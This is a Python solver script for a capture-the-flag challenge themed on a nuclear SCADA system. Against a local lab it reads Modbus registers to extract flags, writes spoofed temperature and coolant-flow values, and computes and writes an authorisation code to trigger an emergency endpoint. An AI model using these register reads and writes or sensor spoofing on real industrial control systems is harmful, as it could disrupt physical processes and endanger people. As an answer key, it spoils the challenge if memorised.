#!/usr/bin/env python3
"""Solver for the Aït Baha Nuclear OT/SCADA challenge.

Chain:
  F1 (medium) — enumerate HR 50.. → ASCII bytes of the first flag
  F2 (medium) — spoof HR 0 (temp) and HR 1 (flow) → unlock /calibration
  F3 (hard)   — read operator_code from IR 100.., compute
                int(sha256(code)[:4], 16), write it to HR 5, set HR 4=1,
                trigger /emergency → flag 3
"""
from __future__ import annotations

import hashlib
import re
import sys

import requests
from pymodbus.client import ModbusTcpClient

HMI = "http://localhost:8012"
MB_HOST = "localhost"
MB_PORT = 5020

FLAG_RE = re.compile(r"INFODAYS\{[^}]+\}")


def find_flag(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def main() -> int:
    c = ModbusTcpClient(MB_HOST, port=MB_PORT)
    if not c.connect():
        print("[!] cannot reach Modbus backend at", MB_HOST, MB_PORT)
        return 1

    # --- F1: dump HR 50..81 and assemble ASCII ---
    resp = c.read_holding_registers(50, count=80)
    raw = bytes(v & 0xFF for v in resp.registers)
    raw = raw.split(b"\x00", 1)[0]
    print("[+] F1:", raw.decode(errors="replace"))

    # --- F2: spoof sensors, fetch /calibration ---
    c.write_register(0, 200)  # core_temp = 20.0 °C (x10)
    c.write_register(1, 0)    # coolant_flow = 0
    # rod_position is already 100 by default
    f2 = find_flag(requests.get(f"{HMI}/calibration").text)
    print("[+] F2:", f2)

    # --- F3: read operator code (IR 100..), compute magic, write, trigger /emergency ---
    ir = c.read_input_registers(100, count=16)
    op_code = bytes(v & 0xFF for v in ir.registers).rstrip(b"\x00")
    print("[*] operator_code   =", op_code)
    magic = int(hashlib.sha256(op_code).hexdigest()[:4], 16)
    print("[*] expected magic  =", magic)
    c.write_register(5, magic)
    c.write_register(4, 1)
    f3 = find_flag(requests.get(f"{HMI}/emergency").text)
    print("[+] F3:", f3)

    c.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
